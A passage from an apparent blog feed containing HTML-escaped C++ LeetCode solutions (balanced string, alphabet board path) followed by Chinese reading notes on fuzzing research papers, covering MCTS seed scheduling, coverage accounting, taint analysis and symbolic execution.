class=&quot;type&quot;&gt;int&lt;/span&gt;* count, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; avg)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;Q&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;E&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;W&amp;#x27;&lt;/span&gt;] &amp;lt;= avg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;balancedString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string s)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count[&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c : s) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count[c]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = s.&lt;span class=&quot;built_in&quot;&gt;length&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; avg = len / &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; res = len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; l = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, r = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; l &amp;lt; len; l++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (r &amp;lt; len &amp;amp;&amp;amp; !&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                count[s[r]]--;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                r++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(res, r - l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count[s[l]]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;1138-字母板上的路径&quot;&gt;&lt;a href=&quot;#1138-字母板上的路径&quot; class=&quot;headerlink&quot; title=&quot;1138. 字母板上的路径&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/alphabet-board-path/&quot;&gt;1138. 字母板上的路径&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;string &lt;span class=&quot;title&quot;&gt;alphabetBoardPath&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string target)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, y = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        string res = &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c : target) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; next_x = &lt;span class=&quot;built_in&quot;&gt;getX&lt;/span&gt;(c), next_y = &lt;span class=&quot;built_in&quot;&gt;getY&lt;/span&gt;(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; step_x = &lt;span class=&quot;string&quot;&gt;&amp;#x27;L&amp;#x27;&lt;/span&gt;, step_y = &lt;span class=&quot;string&quot;&gt;&amp;#x27;U&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; diff_x = x - next_x, diff_y = y - next_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_x &amp;gt; x) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                step_x = &lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                diff_x = -diff_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_y &amp;gt; y) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                step_y = &lt;span class=&quot;string&quot;&gt;&amp;#x27;D&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                diff_y = - diff_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_y == &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_x; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_y; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_y; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_x; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res += &lt;span class=&quot;string&quot;&gt;&amp;quot;!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            x = next_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            y = next_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getX&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (c - &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;) % &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getY&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (c - &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;如果默认先纵向走，再横向走，那么当从外部到z时，需要先横向走再纵向走&lt;br&gt;如果默认先横向走，再纵向走，那么当从z到外部时，需要先纵向走再横向走&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2335-装满杯子需要的最短总时长&quot;&gt;&lt;a href=&quot;#2335-装满杯子需要的最短总时长&quot; class=&quot;headerlink&quot; title=&quot;2335. 装满杯子需要的最短总时长&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-amount-of-time-to-fill-cups/&quot;&gt;2335. 装满杯子需要的最短总时长&lt;/a&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>DNS第五周文献阅读</title>
    <link href="https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    <id>https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/</id>
    <published>2023-02-12T04:15:37.000Z</published>
    <updated>2023-02-12T13:57:28.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided"><a href="#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided" class="headerlink" title="Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided"></a>Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided</h2><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><p>在本研究中，我们发现种子之间的关系对于种子调度是有价值的。我们通过研究和利用种子之间的变异关系，设计并提出了一个”种子变异树”。利用”种子变异树”，我们进一步将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题。即在MCTS估计的基础上，通过最优路径遍历”种子变异树”，选择下一个种子进行模糊处理。</p><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>大量的种子调度策略被提出。一般来说，这些策略的目的是根据一定的标准为每个种子分配一个分数，然后选择分数最高的种子进行下一次的模糊迭代。例如，AFL偏好于具有最小尺寸和最短执行时间的种子。这些策略独立地对待这些种子，并没有明确地考虑种子之间的关系。</p><p>“种子变异树”的主要优点是有利于种子调度在利用式(即,反复锻炼一个高电位的种子和它的邻居)和探索式(即,尝试一个很少锻炼的种子)之间进行平衡，以获得最佳性能。如上所述，种子调度是指为探索其邻居路径而选择一条执行路径。利用种子之间的关系，我们可以进一步将每个种子对应的路径组织为一个树结构，记为执行树。</p><h3 id="论文贡献"><a href="#论文贡献" class="headerlink" title="论文贡献"></a>论文贡献</h3><ul><li>新见解。我们重点观察到种子之间的关系对于种子调度是有价值的。我们研究并利用种子变异关系来构建一个”种子变异树”，它是模糊测试执行树的近似，可以进一步帮助种子调度平衡利用和探索。</li><li>新的fuzzing技术。利用”种子变异树”，我们将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题，并提出了基于MCTS的种子调度策略。由于MCTS算法的性质，该策略在利用和探索之间取得了平衡。</li></ul><h3 id="种子变异树"><a href="#种子变异树" class="headerlink" title="种子变异树"></a>种子变异树</h3><p>种子变异树被定义成一个三元组，T &#x3D; (V, E, 𝛼),V是种子，E是边，𝛼是突变关系</p><ul><li>最初，树由根节点和几个初始种子的节点构成</li><li>选择一个种子变异，生成新的测试用例。然后，将新生成的覆盖新路径的测试用例作为原始种子的子代加入到”种子变异树”中。</li><li>一些特殊的突变可能作用于两个种子。例如，AFL中剪接体的突变会将一个种子与第二个种子进行剪接，产生新的输入。在这种情况下，我们只在新节点和第一个种子对应的节点之间构造一条边，因为第一个种子是通过种子调度策略选择的，而第二个种子是随机选择的。</li></ul><h4 id="三个挑战"><a href="#三个挑战" class="headerlink" title="三个挑战"></a>三个挑战</h4><ul><li>搜索空间大且不断增大。因此，我们需要一个启发式算法来提供当前的最佳决策。</li><li>启发式算法的核心是给种子分配分数。然而，随着模糊测试对其相邻路径的探索越来越深入，种子覆盖路径的得分可能会下降。因此，在每次模糊迭代后更新树上所有种子的得分是必要的，但也是具有挑战性的。</li><li>很难平衡开发和利用。由于模糊测试本质上的随机化特性的影响，经过一次模糊测试迭代后计算出的种子评分会受到这种不确定性的影响。因此，如何在这些不确定因素下平衡开发和利用是一个挑战。</li></ul><h3 id="蒙特卡洛搜索"><a href="#蒙特卡洛搜索" class="headerlink" title="蒙特卡洛搜索"></a>蒙特卡洛搜索</h3><p>MCTS是一种通过基于随机抽样的顺序构建树进行最优决策的算法。该过程包括四个步骤：</p><ul><li>选择。MCTS采用特定的树策略，从根节点R开始，递归地选择最优的子节点，直到达到一个叶节点L。</li><li>扩张。如果L不是终端节点，则MCTS创建一个或多个子节点。进一步，从这些子节点中选择一个节点C。在这一步中，子节点指的是来自L定义的状态的任何有效移动。</li><li>仿真。通过随机选择动作来执行，直到达到一个结果或预定义的状态。</li><li>反向传播。这一步回传从新节点C传播到根节点R，更新仿真结果。</li></ul><p>树的置信上界（UCB）：UCB公式平衡了对已知奖励的利用和对相对未访问节点的探索，以获得最佳性能。</p><h4 id="基于蒙特卡洛的种子调度算法"><a href="#基于蒙特卡洛的种子调度算法" class="headerlink" title="基于蒙特卡洛的种子调度算法"></a>基于蒙特卡洛的种子调度算法</h4><p>MCTS从根节点开始，在每个层次上选择得分最高的下一个节点，直到达到一个叶节点。然后，模糊测试在监视新生成的输入的执行的同时随机变异所选的种子。由于并不是所有新生成的输入都提高了代码覆盖率，因此我们先进行仿真，只在树中添加提高代码覆盖率的输入。最后，我们在每次模糊迭代后更新种子的得分</p><h4 id="树的构建与扩展"><a href="#树的构建与扩展" class="headerlink" title="树的构建与扩展"></a>树的构建与扩展</h4><p>“种子变异树”中，一个内部节点有两种不同的角色。首先，它指的是种子。其次，从树的结构来看，它也是子树的根节点。因此，一个内部节点即使有多个子节点也可以被选为种子。<br>作为种子，分数是指选择该种子的模糊度得分。作为子树的根节点，分数指的是选择子树中每个种子的摘要模糊度得分。</p><p>为了解决这种不相容性，我们通过为每个内部节点插入一个变异节点来更新”种子变异树”。内部节点指其子树的根节点，变体指其对应的种子。这样，变体将是内部节点的一个叶子节点。对于模糊得分，内部节点指子树中每个种子的模糊得分汇总。相比之下，变体是指对应种子的模糊度评分。</p><h2 id="Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization"><a href="#Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization" class="headerlink" title="Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization"></a>Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><blockquote><p>论文中提到的，以及我个人需要读懂这篇论文，需要进行补充的背景知识</p></blockquote><h4 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h4><p>污点分析可以抽象成一个三元组&lt;sources, sinks, sanitizers&gt;的形式。sources：污点源，代表直接引入不受信任的数据或者机密数据到系统中。sink：污点汇聚点，代表直接产生安全敏感操作或者泄露隐私数据到外界。sanitizer：无害处理，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。</p><p>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题。</p><p>污点分析的处理过程可以分成 3 个阶段: (1) 识别污点源和汇聚点; (2) 污点传播分析; (3) 无害处理.</p><h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><ul><li><a href="https://www.jianshu.com/p/2ba973c4b0cc/">参考</a></li><li><a href="https://www.baidu.com/s?wd=SymQEMU:Compilation-based%20symbolic%20execution%20for%20binaries">参考论文–SymQEMU:Compilation-based symbolic execution for binaries</a><br>符号执行 （Symbolic Execution）是一种程序分析技术，它可以通过分析程序来得到让特定代码区域执行的输入。顾名思义，使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。<br>在理想模型中，程序使用的每个符号变量均应该是一个有符号整数。</li></ul><p>符号执行技术近年来大力发展，一种有效但是代价大的技术，其经常与fuzzing技术混合，并成为混合fuzzing，fuzzing用来探索容易到达的路径，而符号执行用来探索不易到达的路径。</p><p>针对符号执行技术的重要特征之一就是其是否需要提供源代码进行分析，而真实世界中的大多数程序(由于某些原因)是不提供源代码的。</p><h4 id="白盒测试（structure）"><a href="#白盒测试（structure）" class="headerlink" title="白盒测试（structure）"></a>白盒测试（structure）</h4><p>主要专注于测试系统内部的结构，因此需要尽可能的在测试中覆盖到所有必要的要素。</p><ul><li>statement coverage&#x2F;node coverage: test case要确保尽可能覆盖到所有的node（每一个操作在控制流程图(CFG)中就是一个圆角方框即node）</li><li>decision coverage&#x2F;edge coverage: test case要确保尽可能覆盖到所有的edge，（即所有的箭头）</li><li>condition coverage: 这是针对代码中测试的条件语句，每个条件要尽量cover到其所有正确或错误的结果，主要有两种写test case的方法<ul><li>simple: 针对条件语句中所有的条件，每个条件都需要至少有一个T和一个F的情况包括在内（这个情况称为满足simple condition coverage），但是仅仅是针对一个语句里的子条件，整个条件语句的结果可能不会满足一定有T和F（这种情况为满足condition coverage）。</li><li>multiple: 这种方法就是不仅要满足每个子条件有T有F还要将所有可能的子条件的组合情况给列出来</li></ul></li><li>path coverage: 在test case中需要尽量包括所有的路径（即到每一个可能终点的可能路径），值得注意的是如果没有循环才可能cover到所有的情况，即使只有一个循环也无法cover到所有的情况</li><li>loop coverage: 其实算是path coverage的一部分，其旨在测试代码中的循环。</li></ul><h4 id="anti-fuzzing-techniques"><a href="#anti-fuzzing-techniques" class="headerlink" title="anti-fuzzing techniques"></a>anti-fuzzing techniques</h4><p>反模糊化技术通过插入伪路径、在错误处理代码中添加延迟、模糊代码以减缓动态分析来欺骗模糊测试。</p><h4 id="CGF-Coverage-guided-Fuzzing"><a href="#CGF-Coverage-guided-Fuzzing" class="headerlink" title="CGF(Coverage-guided Fuzzing)"></a>CGF(Coverage-guided Fuzzing)</h4><p>fuzzing是一种自动生成和测试输入以发现软件漏洞的程序测试技术。它不需要对程序的理解，也不需要人工生成测试用例，具有灵活性，容易适用于不同的程序。</p><p>覆盖率引导的模糊测试以一个初始输入(种子)和一个目标程序作为输入，产生触发程序错误的输入作为输出。它重复选择一个输入，用输入运行目标程序，并根据当前输入及其运行结果生成新的输入。</p><h3 id="文章贡献"><a href="#文章贡献" class="headerlink" title="文章贡献"></a>文章贡献</h3><ul><li>提出了coverage 